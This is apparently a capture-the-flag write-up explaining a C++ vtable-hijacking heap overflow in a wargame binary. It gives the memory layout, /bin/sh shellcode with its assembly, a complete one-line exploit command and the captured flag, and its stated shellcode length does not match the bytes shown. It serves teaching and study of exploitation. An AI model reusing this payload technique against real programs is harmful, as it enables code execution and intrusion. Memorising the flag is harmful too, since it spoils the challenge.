# Level 9: C++ Vtable Hijacking Exploit Explanation

## Overview
Level 9 exploits a C++ vtable hijacking vulnerability through a buffer overflow in the `memcpy()` function. This is a sophisticated attack that manipulates C++ object virtual function tables to redirect code execution.

## The Vulnerability
The binary creates two C++ objects (`N n1(5)` and `N n2(6)`) on the heap and uses `memcpy()` to copy user input into `n1`'s buffer without proper bounds checking.

```cpp
// Vulnerable code structure
class N {
    char annotation[100];  // Buffer at offset 0x4
    int number;           // Value at offset 0x68
    // vtable pointer at offset 0x0
};
```

## Memory Layout on Heap
When objects are allocated:
```
0x804a008: n1 object start
0x804a00c: n1->annotation buffer (our shellcode goes here)
0x804a070: n1->number
0x804a074: n2 object start  
0x804a078: n2->annotation buffer
0x804a0dc: n2->number
```

## The Exploit Strategy

### 1. Vtable Hijacking Concept
- Each C++ object has a vtable pointer at offset 0x0 pointing to its virtual function table
- When `n1 + n2` is called, it invokes `n1->operator+(n2)` via the vtable
- We overwrite n2's vtable pointer to point to our fake vtable
- Our fake vtable contains an address pointing to shellcode

### 2. Payload Structure
```
┌─────────────────┬─────────────────┬─────────────────┬─────────────────┐
│ Fake Vtable     │   Shellcode     │    Padding      │ Vtable Pointer  │
│ (4 bytes)       │   (32 bytes)    │   (76 bytes)    │   (4 bytes)     │
└─────────────────┴─────────────────┴─────────────────┴─────────────────┘
│                 │                 │                 │
│                 │                 │                 └─ Points to fake vtable
│                 │                 └─ Reaches n2's vtable ptr at offset 108  
│                 └─ Our malicious code
└─ Points to shellcode (vtable entry for operator+)
```

### 3. Detailed Breakdown

**Part 1: Fake Vtable Entry (4 bytes)**
```python
"\x10\xa0\x04\x08"  # Address 0x0804a010 (points to shellcode)
```
- This becomes the fake vtable entry for `operator+`
- Points to offset +4 from buffer start (where shellcode begins)

**Part 2: Shellcode (32 bytes)**
```python
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
Assembly breakdown:
```asm
xor eax, eax        ; Clear eax
push eax            ; Push NULL terminator
push 0x68732f2f     ; Push "//sh"  
push 0x6e69622f     ; Push "/bin"
mov ebx, esp        ; ebx = "/bin//sh"
mov ecx, eax        ; ecx = NULL (no args)
mov edx, eax        ; edx = NULL (no env)
mov al, 0x0b        ; execve syscall number
int 0x80            ; Execute syscall
xor eax, eax        ; Clear eax for exit
inc eax             ; eax = 1 (exit syscall)
int 0x80            ; Exit cleanly
```

**Part 3: Padding (76 bytes)**
```python
"A" * 76
```
- Fills the remaining space in n1's buffer
- Reaches exactly to n2's vtable pointer at offset 108

**Part 4: Vtable Pointer Override (4 bytes)**
```python
"\x0c\xa0\x04\x08"  # Address 0x0804a00c (points to fake vtable)
```
- Overwrites n2's vtable pointer
- Points to our buffer start where fake vtable is stored

## Execution Flow

1. **Buffer Overflow**: `memcpy()` copies our 112-byte payload into n1's 100-byte buffer
2. **Heap Corruption**: Overflow corrupts n2's vtable pointer at offset 108
3. **Method Call**: `n1 + n2` triggers `n1->operator+(n2)`
4. **Vtable Lookup**: CPU looks up n2's vtable (now points to our buffer)
5. **Function Call**: Calls address from fake vtable (points to our shellcode)
6. **Shell Execution**: Shellcode executes `/bin//sh` and spawns shell

## Key Addresses
- `0x804a00c`: Start of n1's annotation buffer (fake vtable location)
- `0x804a010`: Shellcode location (fake vtable + 4 bytes)
- `0x804a074`: n2's vtable pointer location (offset 108 from n1 start)

## Why This Works
1. **Heap Layout Predictability**: Objects allocated consecutively on heap
2. **No Stack Protection**: Heap-based attack bypasses stack canaries
3. **C++ Vtable Mechanism**: Virtual function calls use indirect addressing
4. **Controlled Overflow**: Precise overflow length overwrites exact target

## Final Payload Command
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
```

## Result
- Spawns shell as `bonus0` user
- Flag retrieved: `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

## Security Lessons
- C++ vtable hijacking is powerful when heap layout is predictable
- Virtual function calls create indirect jump opportunities
- Proper bounds checking in `memcpy()` would prevent this attack
- Modern mitigations include ASLR, vtable guards, and CFI protection